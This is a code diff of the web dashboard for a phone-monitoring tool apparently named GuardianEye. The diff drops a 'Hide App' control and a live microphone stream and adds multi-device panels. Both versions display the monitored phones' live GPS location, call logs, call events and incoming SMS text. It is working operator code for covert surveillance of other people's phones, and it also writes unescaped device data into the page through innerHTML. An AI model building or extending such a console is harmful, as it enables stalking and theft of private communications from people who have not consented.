@@ -4,150 +4,47 @@
   <meta charset="UTF-8">
   <title>GuardianEye Dashboard</title>
   <script src="/socket.io/socket.io.js"></script>
-
-  <!-- Leaflet Map -->
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 20px;
       background: #f4f6f9;
     }
-    h1, h2 {
-      text-align: center;
-    }
-    #map {
-      height: 600px;
-      width: 100%;
-      margin-top: 10px;
+    h1 { text-align: center; }
+    #devices { display: flex; flex-wrap: wrap; gap: 20px; }
+    .device-panel {
+      flex: 1 1 45%;
+      background: #fff;
       border-radius: 12px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    }
-    #status {
-      margin: 10px 0;
-      padding: 10px;
-      background: #fff;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-    }
-    button {
-      display: inline-block;
-      margin: 10px;
-      padding: 10px 20px;
-      background: #007bff;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:hover {
-      background: #0056b3;
-    }
-    #audioStatus {
-      text-align: center;
-      margin-top: 5px;
-      font-style: italic;
-    }
-    table {
-      width: 100%;
-      margin-top: 15px;
-      border-collapse: collapse;
-      background: #fff;
-      border-radius: 8px;
-      overflow: hidden;
+      padding: 15px;
       box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      min-width: 400px;
     }
-    th, td {
-      border: 1px solid #ddd;
-      padding: 8px;
-      text-align: center;
-    }
-    th {
-      background: #007bff;
-      color: #fff;
-    }
-    tr:nth-child(even) {
-      background: #f9f9f9;
-    }
-    .eventList {
-      margin-top: 15px;
-      padding: 10px;
-      background: #fff;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      max-height: 200px;
-      overflow-y: auto;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    }
-    .eventList div {
-      margin-bottom: 5px;
-      padding: 5px;
-      border-bottom: 1px solid #eee;
-    }
-    .eventList div:last-child {
-      border-bottom: none;
-    }
-    .control-buttons {
-      text-align: center;
-      margin: 20px 0;
-    }
+    .map { height: 250px; border-radius: 8px; margin-bottom: 10px; }
+    table { width: 100%; margin-top: 10px; border-collapse: collapse; }
+    th, td { border: 1px solid #ddd; padding: 6px; text-align: center; }
+    th { background: #007bff; color: #fff; }
+    .eventList { max-height: 120px; overflow-y: auto; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; padding: 5px; }
   </style>
 </head>
 <body>
   <h1>GuardianEye Dashboard</h1>
-
   <div id="status">🔴 Disconnected</div>
 
-  <div class="control-buttons">
-    <button id="hideApp">👻 Hide App</button>
-    <button id="showApp">📲 Show App</button>
-  </div>
-
-  <h2>Live Map</h2>
-  <div id="map"></div>
-
-  <h2>Live Audio</h2>
-  <button id="startAudio">▶ Start Listening</button>
-  <p id="audioStatus">Click the button to start audio.</p>
-
-  <h2>📋 Call Logs</h2>
-  <table id="callLogsTable">
-    <thead>
-      <tr>
-        <th>Number</th>
-        <th>Type</th>
-        <th>Date</th>
-        <th>Duration (s)</th>
-      </tr>
-    </thead>
-    <tbody id="callLogsBody">
-      <tr><td colspan="4">Waiting for call logs...</td></tr>
-    </tbody>
-  </table>
-
-  <h2>📞 Real-time Call Events</h2>
-  <div id="callEventsList" class="eventList">
-    <div>Waiting for call events...</div>
-  </div>
-
-  <h2>📨 Real-time SMS Messages</h2>
-  <div id="smsList" class="eventList">
-    <div>Waiting for SMS messages...</div>
-  </div>
+  <div id="devices"></div> <!-- container for dynamic device panels -->
 
   <script>
     const socket = io();
-
     const statusDiv = document.getElementById("status");
+    const devicesContainer = document.getElementById("devices");
+    const devicePanels = {}; // store UI refs per device
+
     socket.on("connect", () => {
       statusDiv.innerText = "🟢 Connected to server";
       statusDiv.style.color = "green";
-
       socket.emit("listener-register");
-      console.log("Listener registered");
     });
 
     socket.on("disconnect", () => {
@@ -155,118 +52,75 @@
       statusDiv.style.color = "red";
     });
 
-    // === CONTROL BUTTONS FOR HIDE/SHOW APP ===
-    document.getElementById("hideApp").addEventListener("click", () => {
-      socket.emit("hide-app-server");
-      console.log("👻 Hide App command sent to server");
-    });
+    // === CREATE PANEL FOR DEVICE ===
+    function createDevicePanel(deviceId) {
+      if (devicePanels[deviceId]) return devicePanels[deviceId];
 
-    document.getElementById("showApp").addEventListener("click", () => {
-      socket.emit("show-app-server");
-      console.log("📲 Show App command sent to server");
-    });
+      const panel = document.createElement("div");
+      panel.className = "device-panel";
+      panel.innerHTML = `
+        <h2>Device: ${deviceId}</h2>
+        <div class="map" id="map-${deviceId}"></div>
+        <h3>📋 Call Logs</h3>
+        <table>
+          <thead><tr><th>Number</th><th>Type</th><th>Date</th><th>Duration</th></tr></thead>
+          <tbody id="logs-${deviceId}"><tr><td colspan="4">Waiting...</td></tr></tbody>
+        </table>
+        <h3>📞 Call Events</h3>
+        <div id="calls-${deviceId}" class="eventList"><div>Waiting...</div></div>
+        <h3>📨 SMS</h3>
+        <div id="sms-${deviceId}" class="eventList"><div>Waiting...</div></div>
+      `;
+      devicesContainer.appendChild(panel);
 
-    // === MAP ===
-    const map = L.map('map').setView([20, 78], 5);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      attribution: '© OpenStreetMap contributors'
-    }).addTo(map);
+      const map = L.map(`map-${deviceId}`).setView([20,78], 5);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
-    let marker;
-    socket.on("location-update", (data) => {
-      if (!data.lat || !data.lng) return;
-      if (!marker) {
-        marker = L.marker([data.lat, data.lng]).addTo(map);
-      } else {
-        marker.setLatLng([data.lat, data.lng]);
-      }
-      map.setView([data.lat, data.lng], 15);
-    });
-
-    // === AUDIO ===
-    let audioContext = null;
-    let audioQueue = [];
-    let isPlaying = false;
-
-    document.getElementById("startAudio").addEventListener("click", () => {
-      if (!audioContext) {
-        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        document.getElementById("audioStatus").innerText = "🎧 Listening...";
-        console.log("AudioContext started");
-      }
-      if (!isPlaying) playNextChunk();
-    });
-
-    function playNextChunk() {
-      if (!audioQueue.length || !audioContext) {
-        isPlaying = false;
-        return;
-      }
-      const float32Array = audioQueue.shift();
-      const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
-      audioBuffer.copyToChannel(float32Array, 0);
-
-      const bufferSource = audioContext.createBufferSource();
-      bufferSource.buffer = audioBuffer;
-      bufferSource.connect(audioContext.destination);
-      bufferSource.onended = playNextChunk;
-      bufferSource.start();
-      isPlaying = true;
+      devicePanels[deviceId] = {
+        map, marker: null,
+        logsBody: panel.querySelector(`#logs-${deviceId}`),
+        callsList: panel.querySelector(`#calls-${deviceId}`),
+        smsList: panel.querySelector(`#sms-${deviceId}`)
+      };
+      return devicePanels[deviceId];
     }
 
-    socket.on("audio-chunk", (base64Chunk) => {
-      if (!audioContext) return;
-      const byteString = atob(base64Chunk.replace(/\n/g,''));
-      const buffer = new Uint8Array(byteString.length);
-      for (let i = 0; i < byteString.length; i++) buffer[i] = byteString.charCodeAt(i);
-
-      const float32Array = new Float32Array(buffer.length / 2);
-      for (let i = 0; i < float32Array.length; i++) {
-        let int16 = (buffer[i*2 +1] << 8) | buffer[i*2];
-        if (int16 >= 32768) int16 -= 65536;
-        float32Array[i] = int16 / 32768;
+    // === DATA HANDLERS ===
+    socket.on("location-update", ({ deviceId, lat, lng }) => {
+      const panel = createDevicePanel(deviceId);
+      if (!lat || !lng) return;
+      if (!panel.marker) {
+        panel.marker = L.marker([lat,lng]).addTo(panel.map);
+      } else {
+        panel.marker.setLatLng([lat,lng]);
       }
-
-      audioQueue.push(float32Array);
-      if (!isPlaying) playNextChunk();
+      panel.map.setView([lat,lng], 14);
     });
 
-    // === CALL LOGS ===
-    socket.on("call-logs", (logs) => {
-      const tbody = document.getElementById("callLogsBody");
+    socket.on("call-logs", ({ deviceId, logs }) => {
+      const panel = createDevicePanel(deviceId);
+      const tbody = panel.logsBody;
       tbody.innerHTML = "";
-      if (!logs || logs.length === 0) {
-        tbody.innerHTML = "<tr><td colspan='4'>No call logs available</td></tr>";
-        return;
-      }
       logs.forEach(log => {
         const row = document.createElement("tr");
-        row.innerHTML = `
-          <td>${log.number || "Unknown"}</td>
-          <td>${log.type}</td>
-          <td>${new Date(log.date).toLocaleString()}</td>
-          <td>${log.duration}</td>
-        `;
+        row.innerHTML = `<td>${log.number}</td><td>${log.type}</td><td>${new Date(log.date).toLocaleString()}</td><td>${log.duration}</td>`;
         tbody.appendChild(row);
       });
     });
 
-    // === REAL-TIME CALL EVENTS ===
-    const callEventsList = document.getElementById("callEventsList");
-    socket.on("call-event", (event) => {
+    socket.on("call-event", ({ deviceId, event }) => {
+      const panel = createDevicePanel(deviceId);
       const div = document.createElement("div");
-      div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number || "Unknown"}`;
-      callEventsList.prepend(div);
+      div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number}`;
+      panel.callsList.prepend(div);
     });
 
-    // === REAL-TIME SMS MESSAGES ===
-    const smsList = document.getElementById("smsList");
-    socket.on("sms-received", (sms) => {
+    socket.on("sms-received", ({ deviceId, sms }) => {
+      const panel = createDevicePanel(deviceId);
       const div = document.createElement("div");
-      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.number || "Unknown"}: ${sms.body}`;
-      smsList.prepend(div);
+      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.number}: ${sms.body}`;
+      panel.smsList.prepend(div);
     });
-
   </script>
 </body>
 </html>
